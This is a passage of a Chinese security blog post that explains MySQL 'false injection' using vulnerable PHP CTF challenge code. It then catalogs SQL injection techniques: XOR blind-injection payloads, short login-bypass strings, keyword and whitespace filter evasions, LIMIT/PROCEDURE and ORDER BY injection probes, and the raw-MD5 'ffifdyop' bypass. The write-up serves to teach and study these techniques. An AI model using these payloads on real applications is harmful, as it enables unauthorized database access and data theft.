class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"></span><br><span class="line">$conn -&gt;query(&quot;set names utf8&quot;);</span><br><span class="line"></span><br><span class="line">function randStr($lenth=32)&#123;</span><br><span class="line">    $strBase = &quot;1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;;</span><br><span class="line">    $str = &quot;&quot;;</span><br><span class="line">    while($lenth&gt;0)&#123;</span><br><span class="line">      $str.=substr($strBase,rand(0,strlen($strBase)-1),1);</span><br><span class="line">      $lenth --;</span><br><span class="line">    &#125;</span><br><span class="line">   return $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($install)&#123;</span><br><span class="line">    $sql = &quot;create table `user` (</span><br><span class="line">         `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,</span><br><span class="line">         `username` varchar(30) NOT NULL,</span><br><span class="line">         `passwd` varchar(32) NOT NULL,</span><br><span class="line">         `role` varchar(30) NOT NULL</span><br><span class="line">       )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci &quot;;</span><br><span class="line">    if($conn-&gt;query($sql))&#123;</span><br><span class="line">       $sql  = &quot;insert into `user`(`username`,`passwd`,`role`) values (&apos;admin&apos;,&apos;&quot;.md5(randStr()).&quot;&apos;,&apos;admin&apos;)&quot;;</span><br><span class="line">       $conn -&gt; query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function filter($str)&#123;</span><br><span class="line">     $filter = &quot;/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&amp;|&quot;.urldecode(&apos;%09&apos;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&apos;%0c&apos;).&quot;|&quot;.urldecode(&apos;%0d&apos;).&quot;|&quot;.urldecode(&apos;%a0&apos;).&quot;/i&quot;;</span><br><span class="line">     if(preg_match($filter,$str))&#123;</span><br><span class="line">         die(&quot;you can&apos;t input this illegal char!&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">     return $str;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function show($username)&#123;</span><br><span class="line">  global $conn;</span><br><span class="line">  $sql = &quot;select role from `user` where username =&apos;&quot;.$username.&quot;&apos;&quot;;</span><br><span class="line">  $res = $conn -&gt;query($sql);</span><br><span class="line">  if($res-&gt;num_rows&gt;0)&#123;</span><br><span class="line"></span><br><span class="line">      echo &quot;$username is &quot;.$res-&gt;fetch_assoc()[&apos;role&apos;];</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">      die(&quot;Don&apos;t have this user!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function login($username,$passwd)&#123;</span><br><span class="line">    global $conn;</span><br><span class="line">    global $flag;</span><br><span class="line"></span><br><span class="line">    $username = trim(strtolower($username));</span><br><span class="line">    $passwd = trim(strtolower($passwd));</span><br><span class="line">    if($username == &apos;admin&apos;)&#123;</span><br><span class="line">        die(&quot;you can&apos;t login this as admin!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $sql = &quot;select * from `user` where username=&apos;&quot;.$conn-&gt;escape_string($username).&quot;&apos; and passwd=&apos;&quot;.$conn-&gt;escape_string($passwd).&quot;&apos;&quot;;</span><br><span class="line">    $res = $conn -&gt;query($sql);</span><br><span class="line">    if($res-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        if($res-&gt;fetch_assoc()[&apos;role&apos;] === &apos;admin&apos;) exit($flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">       echo &quot;sorry,username or passwd error!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function source()&#123;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = isset($_POST[&apos;username&apos;])?filter($_POST[&apos;username&apos;]):&quot;&quot;;</span><br><span class="line">$passwd = isset($_POST[&apos;passwd&apos;])?filter($_POST[&apos;passwd&apos;]):&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$action = isset($_GET[&apos;action&apos;])?filter($_GET[&apos;action&apos;]):&quot;source&quot;;</span><br><span class="line"></span><br><span class="line">switch($action)&#123;</span><br><span class="line">   case &quot;source&quot;: source(); break ;</span><br><span class="line">   case &quot;login&quot; : login($username,$passwd);break;</span><br><span class="line">   case &quot;show&quot; : show($username);break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p> 我们注意到filter()函数<code>$filter = &quot;/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&amp;|&quot;.urldecode(&#39;%09&#39;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&#39;%0c&#39;).&quot;|&quot;.urldecode(&#39;%0d&#39;).&quot;|&quot;.urldecode(&#39;%a0&#39;).&quot;/i&quot;;</code></p>
+<p>这里看起来过滤的比较多，其中and，or还有\&amp;，|都被过滤了，这个时候就可以利用false进行盲注。</p>
+<p>可以在show函数利用查询的时候注入，</p>
+<p><code>username = &quot;admin&#39;^!(mid((passwd)from(-{pos}))=&#39;{passwd}&#39;)=&#39;1&quot;</code></p>
+<p>这里官方给出的就是利用异或，其实这里并不需要’admin‘只要是一串字符串就可以</p>
+<p><img src="http://ww1.sinaimg.cn/large/7e2785d1ly1feyrzfspc1j20at071744.jpg" alt="">  </p>
+<p>异或会使字符串都转为浮点数，都变为了0，由于0=0^0 -&gt; 1^0 -&gt; 1<br>当然对于这个题并不一定利用这个，直接截取字符串作比较就可以，但是这里只是提供一种姿势，由于mysql的灵活，其花样也比较多<br>还有就是构造的payload比较简短，例如<code>&#39;+&#39;、&#39;^&#39;、&#39;/4#</code>这样只有三个字符便可以绕过登录，简单粗暴，还有就是类似的文章不多，许多开发人员容易忽视这些细节。</p>
+<h5 id="4-1、结合盲注"><a href="#4-1、结合盲注" class="headerlink" title="4.1、结合盲注"></a>4.1、结合盲注</h5><p>这里false注入如果是在一些非验证的地方利用的地方基本是需要盲注，姿势比较多</p>
+<h3 id="0x02、一些注入的技巧"><a href="#0x02、一些注入的技巧" class="headerlink" title="0x02、一些注入的技巧"></a>0x02、一些注入的技巧</h3><p>通常注入利用的姿势不是靠一个点就可以突破的，往往需要结合许多姿势技巧</p>
+<p>mysql的注入过程中，我们用得到的一些：<br>常量：<code>true， false， null， \N, current_timestamp</code><br>变量：<code>@myvar:=1</code></p>
+<p>系统变量：<code>@@version, @@datadir....</code></p>
+<p>常用函数：<code>version(), pi(), pow(), char(), substring()</code></p>
+<p>字符串生成：<code>hex(), conv()</code></p>
+<p>​    有关于字符串生成的一些基础字符(其余的字符可以由此扩展)：</p>
+<p><code>true=1,floor(pi())=3,ceil(pi())=4,floor(version())=5,ceil(version())=6</code></p>
+<h4 id="1、过滤的绕过："><a href="#1、过滤的绕过：" class="headerlink" title="1、过滤的绕过："></a>1、过滤的绕过：</h4><p>过滤空格：<code>%20, %09, %0a, %0b, %0c, %0d, %a0，还有一些可以利用括号或者注释</code></p>
+<p>过滤and，or：||，&amp;&amp;</p>
+<p>union select：</p>
+<pre><code>利用括号，&apos;and(true)like(false)union(select(pass)from(users))，
+方括号union [all|distinct] select pass from users#，
+union%a0select pass from users，
+或者内联注释union/*&amp;sort=*/select pass from users#
+</code></pre><p>union：<code>子查询进行盲注and length((select pass from users having substr(pass,1,1)=&#39;a&#39;))</code></p>
+<p>having：<code>and(select substr(group_concat(pass),1,1)from users)=&#39;a</code></p>
+<p>select … from(过滤代码如/SELECT\s+[A-Za-z.]+\s+FROM/i/i)：</p>
+<pre><code>select [all|distinct] pass from users
+select`table_name`from`information_schema` . `tables`
+select pass as alias from users
+select pass aliasalias from users
+select pass`alias alias`from users
+select+pass%a0from(users)
+</code></pre><p>and,&amp;,or,|：</p>
+<pre><code>这里就是可以利用上文中提到的false注入的方式进行绕过
+可以通过字符串比较引入查询
+譬如&apos;=1=(select .....)
+</code></pre><p>过滤逗号：<code>&#39; and substr(data from 1 for 1) = &#39;a&#39;#</code></p>
+<h4 id="2、技巧："><a href="#2、技巧：" class="headerlink" title="2、技巧："></a>2、技巧：</h4><p>下面说几种不同情境的注入技巧</p>
+<h5 id="2-1、like"><a href="#2-1、like" class="headerlink" title="2.1、like"></a>2.1、like</h5><p>有时候我们可以利用一些逻辑语句进行注入例如在最近的0ctf上的Temmo’s Tiny Shop这个题中，我们在搜索的时候推测出语句是在like后的，就可以通过left来进行like盲注</p>
+<p><code>if((select(left((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),3))like(0x2562)),name,price)</code></p>
+<h5 id="2-2、Limt"><a href="#2-2、Limt" class="headerlink" title="2.2、Limt"></a>2.2、Limt</h5><p>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO是需要写的权限。</p>
+<p>利用PROCEDURE 有两种方式，基于报错和时间的，具体文章见这里<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="noopener">Mysql下Limit注入方法</a></p>
+<p>基于报错：</p>
+<p><code>mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</code></p>
+<p>基于时间：</p>
+<p><code>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></p>
+<h5 id="2-3、order-by"><a href="#2-3、order-by" class="headerlink" title="2.3、order by"></a>2.3、order by</h5><p>order by 后的数字可以作为一个注入点。具体可以看这个文章<a href="https://www.secpulse.com/archives/57197.html" target="_blank" rel="noopener">MySQL Order By 注入总结</a></p>
+<p>这里可以用一些判断和返回值进行利用，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?order=IF(1=1,name,price) 通过name字段排序</span><br><span class="line">/?order=IF(1=2,name,price) 通过price字段排序</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?order=(CASE+WHEN+(1=1)+THEN+name+ELSE+price+END) 通过name字段排序</span><br><span class="line">/?order=(CASE+WHEN+(1=2)+THEN+name+ELSE+price+END) 通过price字段排序</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?order=IFNULL(NULL,price) 通过price字段排序</span><br><span class="line">/?order=IFNULL(NULL,name) 通过name字段排序</span><br></pre></td></tr></table></figure>
+<p>还可以用rand函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?order=rand(1=1)</span><br><span class="line">/?order=rand(1=2)</span><br></pre></td></tr></table></figure>
+<p>通常这里我们是不知道列名的，那可以通过报错进行利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/?order=IF(1=1,1,(select+1+from+information_schema.tables)) 正常</span><br><span class="line">/?order=IF(1=2,1,(select+1+from+information_schema.tables)) 错误</span><br><span class="line"></span><br><span class="line">利用regexp</span><br><span class="line">/?order=(select+1+regexp+if(1=1,1,0x00)) 正常</span><br><span class="line">/?order=(select+1+regexp+if(1=2,1,0x00)) 错误</span><br><span class="line"></span><br><span class="line">利用updatexml</span><br><span class="line">/?order=updatexml(1,if(1=1,1,user()),1) 正确</span><br><span class="line">/?order=updatexml(1,if(1=2,1,user()),1) 错误</span><br><span class="line"></span><br><span class="line">利用extractvalue</span><br><span class="line">/?order=extractvalue(1,if(1=1,1,user())) 正确</span><br><span class="line">/?order=extractvalue(1,if(1=2,1,user())) 错误</span><br><span class="line">利用sleep()也可以....</span><br><span class="line">方法比较灵活</span><br></pre></td></tr></table></figure>
+<h5 id="3、有关函数"><a href="#3、有关函数" class="headerlink" title="3、有关函数"></a>3、有关函数</h5><h6 id="3-1-不常用函数绕过滤"><a href="#3-1-不常用函数绕过滤" class="headerlink" title="3.1 不常用函数绕过滤"></a>3.1 不常用函数绕过滤</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lpad(data,1,space(1)) // lpad(&apos;hi&apos;,4,&apos;?&apos;) = &apos;??hi&apos;</span><br><span class="line">rpad(data,1,space(1)) // rpad(&apos;hi&apos;,4,&apos;?&apos;) = &apos;hi??&apos;</span><br><span class="line">left(data,1)</span><br><span class="line">reverse(right(reverse(data),1))</span><br><span class="line">insert(insert(version(),1,0,space(0)),2,222,space(0))</span><br></pre></td></tr></table></figure>
+<h6 id="3-2-搜索匹配类的函数"><a href="#3-2-搜索匹配类的函数" class="headerlink" title="3.2 搜索匹配类的函数"></a>3.2 搜索匹配类的函数</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;-if(locate(&apos;f&apos;,data),1,0)#</span><br><span class="line">&apos;-if(locate(&apos;fo&apos;,data),1,0)#</span><br><span class="line">&apos;-if(locate(&apos;foo&apos;,data),1,0)#</span><br><span class="line">instr(), position()</span><br></pre></td></tr></table></figure>
+<h6 id="3-3、一些数学函数"><a href="#3-3、一些数学函数" class="headerlink" title="3.3、一些数学函数"></a>3.3、一些数学函数</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1、format(x,y)  函数，功能是将一个数字x，保留y位小数，并且整数部分用逗号分隔千分位，小数部分四舍五入。</span><br><span class="line">2、abs();  求一个数的绝对值；absolute</span><br><span class="line">3、sqrt();求一个数的平方根。sqrt是sqruar(平方，矩形) ，root（根）的缩写。</span><br><span class="line">4、mod(x,y)  x除数，y被除数。结束是余数。</span><br><span class="line">5、ceil()  进一取整。floor()舍一取整</span><br><span class="line">这两个函数是镜子函数，比较有点意思。这两个函数并不进行四舍五入，比较强硬。</span><br><span class="line">6、rand()  顾名思义，是用来生成随机数用的。种子不变数值不变。</span><br><span class="line">7、format 会自动进行千分位，下面我们来看看round函数，进行四舍五入。</span><br><span class="line">8、truncate(x,y)  比较霸道，不管四舍五入，直接把x，的y位小数直接干掉。</span><br><span class="line">9、sign() 返回当前结果得符号，如果是负数返回-1，如果是0 返回0 如果是正数，返回1.</span><br><span class="line">10、power()  幂运算</span><br><span class="line">11.SIN(X)、ASIN(X)、COS(X)、ACOS(X)、TAN(X)、ATAN(X)、COT(X)  三角函数</span><br><span class="line">12.RADIANS(X) 和 DEGREES(X): 角度与弧度转换函数</span><br><span class="line">13. LOG(X)和LOG10(X): 对数运算函数</span><br><span class="line">14. POW(X,Y), POWER(X,Y)和EXP(X)</span><br></pre></td></tr></table></figure>
+<h6 id="3-4、使用函数进行字符串的切割"><a href="#3-4、使用函数进行字符串的切割" class="headerlink" title="3.4、使用函数进行字符串的切割"></a>3.4、使用函数进行字符串的切割</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">length(trim(leading &apos;a&apos; FROM data)) # length will be shorter</span><br><span class="line">length(replace(data, &apos;a&apos;, &apos;&apos;)) # length will be shorter</span><br></pre></td></tr></table></figure>
+<h4 id="4-关于php中md5的一个有意思的小技巧"><a href="#4-关于php中md5的一个有意思的小技巧" class="headerlink" title="4 关于php中md5的一个有意思的小技巧"></a>4 关于php中md5的一个有意思的小技巧</h4><p>PHP中这么一段sql语句</p>
+<p><code>$sql = &quot;SELECT * FROM admin WHERE pass = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</code></p>
+<p>这里是可以注入绕过的，在php关于<a href="http://php.net/manual/en/function.md5.php" target="_blank" rel="noopener">MD5函数</a>的介绍说</p>
+<p>如果可选的 <code>raw_output</code> 被设置为 <strong>TRUE</strong>，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</p>
+<p>也就是找到一个字符串MD5的二进制恰好和字符编码中的某些编码对上了，就可以产生注入，原文作者找到这么一串字符串<code>ffifdyop</code>,md5加密后对应字符编码刚好是<code>&#39;or&#39;&lt;trash&gt;</code>,便产生注入</p>
+<p>这里的<a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes" target="_blank" rel="noopener">原文在这</a></p>
+<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><p>false注入也许在某些时候会利用，但是对其中并不是很了解，所以在这里进行了一下系统地总结。  </p>
+<p>同时往往在利用的时候往往不只是一个点，要结合许多姿势。文章后半部分就是总结了一些注入小姿势，并不是很系统有些散，如果有错误欢迎大佬指出。</p>
+<p>参考：</p>
+<p><a href="https://www.exploit-db.com/papers/18263/" target="_blank" rel="noopener">https://www.exploit-db.com/papers/18263/</a></p>
+<p><a href="https://www.secpulse.com/archives/57197.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/57197.html</a></p>
+<p><a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes" target="_blank" rel="noopener">http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/leejgod">Projects</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-False-Injection"><span class="toc-number">1.</span> <span class="toc-text">0x01 False Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0-引子"><span class="toc-number">1.1.</span> <span class="toc-text">0 :引子</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1：MYSQL隐式类型转换"><span class="toc-number">1.2.</span> <span class="toc-text">1：MYSQL隐式类型转换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、原理"><span class="toc-number">1.3.</span> <span class="toc-text">2、原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、利用"><span class="toc-number">1.4.</span> <span class="toc-text">3、利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-1、算术运算"><span class="toc-number">1.4.1.</span> <span class="toc-text">3.1、算术运算</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2、-位操作运算"><span class="toc-number">1.4.2.</span> <span class="toc-text">3.2、 位操作运算</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-3、-比较运算符"><span class="toc-number">1.4.3.</span> <span class="toc-text">3.3、 比较运算符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-4、-其他"><span class="toc-number">1.4.4.</span> <span class="toc-text">3.4、 其他</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、综合利用"><span class="toc-number">1.5.</span> <span class="toc-text">4、综合利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#4-1、结合盲注"><span class="toc-number">1.5.1.</span> <span class="toc-text">4.1、结合盲注</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02、一些注入的技巧"><span class="toc-number">2.</span> <span class="toc-text">0x02、一些注入的技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、过滤的绕过："><span class="toc-number">2.1.</span> <span class="toc-text">1、过滤的绕过：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、技巧："><span class="toc-number">2.2.</span> <span class="toc-text">2、技巧：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1、like"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.1、like</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2、Limt"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2、Limt</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3、order-by"><span class="toc-number">2.2.3.</span> <span class="toc-text">2.3、order by</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3、有关函数"><span class="toc-number">2.2.4.</span> <span class="toc-text">3、有关函数</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#3-1-不常用函数绕过滤"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">3.1 不常用函数绕过滤</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-2-搜索匹配类的函数"><span class="toc-number">2.2.4.2.</span> <span class="toc-text">3.2 搜索匹配类的函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-3、一些数学函数"><span class="toc-number">2.2.4.3.</span> <span class="toc-text">3.3、一些数学函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-4、使用函数进行字符串的切割"><span class="toc-number">2.2.4.4.</span> <span class="toc-text">3.4、使用函数进行字符串的切割</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-关于php中md5的一个有意思的小技巧"><span class="toc-number">2.3.</span> <span class="toc-text">4 关于php中md5的一个有意思的小技巧</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#END"><span class="toc-number">3.</span> <span class="toc-text">END</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/&text=False注入,以及SQL注入技巧总结"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/&title=False注入,以及SQL注入技巧总结"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/&is_video=false&description=False注入,以及SQL注入技巧总结"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=False注入,以及SQL注入技巧总结&body=Check out this article: http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/&title=False注入,以及SQL注入技巧总结"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/&title=False注入,以及SQL注入技巧总结"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/&title=False注入,以及SQL注入技巧总结"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/&title=False注入,以及SQL注入技巧总结"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/&name=False注入,以及SQL注入技巧总结&description=&lt;p&gt;利用False我们可以绕过一些特定的WAF以及一些未来不确定的因素，其中有些姿势之前了解但是没有去深入，这次做一个归纳总结。&lt;/p&gt;
+&lt;p&gt;原文首发在安全客，文章地址：&lt;a href=&#34;http://bobao.360.cn/learning/detail/3804.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://bobao.360.cn/learning/detail/3804.html&lt;/a&gt;&lt;br&gt;有点可惜小编排版有些不是很完美。&lt;/p&gt;"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 Leej
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/leejgod">Projects</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
